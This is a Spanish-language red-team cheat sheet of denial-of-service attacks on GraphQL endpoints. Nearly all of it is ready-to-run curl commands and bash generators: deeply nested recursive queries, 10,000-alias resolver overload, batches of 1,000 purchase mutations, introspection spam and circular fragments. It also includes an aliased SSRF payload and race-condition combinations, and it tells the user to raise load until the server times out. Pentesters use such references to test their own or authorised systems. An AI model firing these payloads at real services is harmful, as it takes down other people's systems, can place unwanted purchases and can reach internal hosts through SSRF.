---
aliases:
  - GraphQL DoS
  - Nested Query DoS
  - Aliases Overload
  - Circular Fragments
tags:
  - vuln/graphql
  - vuln/dos
  - technique/impact
  - asset/web-app
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación|Explotación]]"
  - "[[Web]]"
tertiary categories:
  - "[[Web Explotación]]"
kind: SubCheatSheet
linked:
  - "[[GraphQL Injection]]"
---
# GraphQL - DoS

---

## Deeply Nested Queries (Recursión)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"{user{posts{author{posts{author{posts{author{id}}}}}}}}"}' https://target/graphql` | 6 niveles de recursión | Type cycle User↔Post. |
| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"{user{friends{friends{friends{friends{friends{name}}}}}}}"}' https://target/graphql` | Friend-of-friend explosion | Self-referencing relations. |
| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"{users(first:1000){posts(first:1000){comments(first:1000){body}}}}"}' https://target/graphql` | N³ resolves (10⁹ ops) | Pagination sin limit. |
| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"{me{manager{manager{manager{manager{name}}}}}}"}' https://target/graphql` | Self-ref recursion | Type con field a sí mismo. |
| `time curl -sX POST -H 'Content-Type: application/json' -d '{"query":"{me{friends{friends{friends{friends{name}}}}}}"}' https://target/graphql` | Mide latencia → confirma DoS | Pre-attack check. |
^graphql-dos-nested

Para profundidad arbitraria (auto-tune): ver **Generador nested query (bash)** abajo.

### Generador nested query (bash)

```bash
# Genera query con N niveles de nested User→friends
N=15
QUERY="{me"
for i in $(seq 1 $N); do QUERY+="{friends"; done
QUERY+="{name}"
for i in $(seq 1 $N); do QUERY+="}"; done
QUERY+="}"

curl -X POST -H "Content-Type: application/json" \
  -d "{\"query\":\"$QUERY\"}" \
  https://target/graphql
```

---

## Aliases Overloading

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"{a1:expensiveQuery(id:1){result} a2:expensiveQuery(id:2){result}}"}' https://target/graphql` | 2+ resolves single query | Aliases sin limit. |
| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"{a:fetch(url:\"http://t1\") b:fetch(url:\"http://t2\") c:fetch(url:\"http://t3\")}"}' https://target/graphql` | Multi-target SSRF en 1 request | Combine con SSRF resolver. |
| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"mutation{a:expensiveMutation b:expensiveMutation c:expensiveMutation}"}' https://target/graphql` | Aliased mutations en paralelo | Race conditions + DoS. |
^graphql-dos-aliases

Para 10000 aliases sobre un resolver caro (DB pool exhaustion): ver **Generador aliases overload (bash)** abajo. Combo con login brute: ver [[GraphQL - Auth y Logica]].

### Generador aliases overload (bash)

```bash
# 10000 aliases sobre resolver expensive
QUERY='{'
for i in $(seq 1 10000); do
  QUERY+="a${i}:expensiveQuery(id:${i}){result} "
done
QUERY+='}'

curl -X POST -H "Content-Type: application/json" \
  -d "{\"query\":\"$QUERY\"}" \
  https://target/graphql

# Ajustar N: empezar 100, 1000, 10000 hasta que server timeout
```

---

## Field Duplication / Batching Abuse

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"{user{id id id id id id id id id id}}"}' https://target/graphql` | Engine no deduplica → N resolves del mismo field | Engine viejo. |
| `curl -sX POST -H 'Content-Type: application/json' -d '[{"query":"{expensiveQuery{result}}"},{"query":"{expensiveQuery{result}}"}]' https://target/graphql` (×1000) | Single request → N ejecuciones de query pesada | Spec batching habilitado. |
| `curl -sX POST -H 'Content-Type: application/json' -d '[{"query":"{__schema{types{name}}}"},{"query":"{__schema{types{name}}}"}]' https://target/graphql` (×100) | Heavy introspection compute repetido | Introspection no deshabilitada. |
| `curl -sX POST -H 'Content-Type: application/json' -d '[{"query":"mutation{purchase(id:1)}"},{"query":"mutation{purchase(id:1)}"}]' https://target/graphql` (×N) | Race conditions + DoS combo | Mutations idempotentes pero costosas. |
| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"{usrA usrB usrC ... usr10000}"}' https://target/graphql` con 10k field nonexistent | Suggestions engine sobrecarga | "Did you mean" enabled. |
^graphql-dos-batching

### Batched mutations DoS

```bash
# 1000 mutations idénticas en single request
BATCH='['
for i in $(seq 1 1000); do
  BATCH+="{\"query\":\"mutation{purchase(productId:1,quantity:1){id}}\"}"
  [ $i -lt 1000 ] && BATCH+=','
done
BATCH+=']'

curl -X POST -H "Content-Type: application/json" -d "$BATCH" https://target/graphql
```

---

## Circular Fragments

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"query{user{...A}} fragment A on User{...B} fragment B on User{...A}"}' https://target/graphql` | Direct fragment cycle → engine loop | Engine viejo no detecta cycles. |
| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"... fragment A on User{...B} fragment B on User{...C} fragment C on User{...A}"}' https://target/graphql` | 3-way cycle indirect | Detección menos común. |
| `curl -sX POST -H 'Content-Type: application/json' -d '{"query":"{user{... on User{... on User{... on User{name}}}}}"}' https://target/graphql` | Inline fragment self-loop | Edge case algunos engines. |
| `curl -w "@curl-format.txt" ...` | Mide tiempo de response | Confirma engine vulnerable. |
^graphql-dos-circular

### PoC circular fragments

```graphql
query Cycle {
  user {
    ...A
  }
}

fragment A on User {
  ...B
}

fragment B on User {
  ...A
}
```

Engine viejo intenta expandir A → expand B → expand A → loop. Apps modernas detectan y rejectan.

---
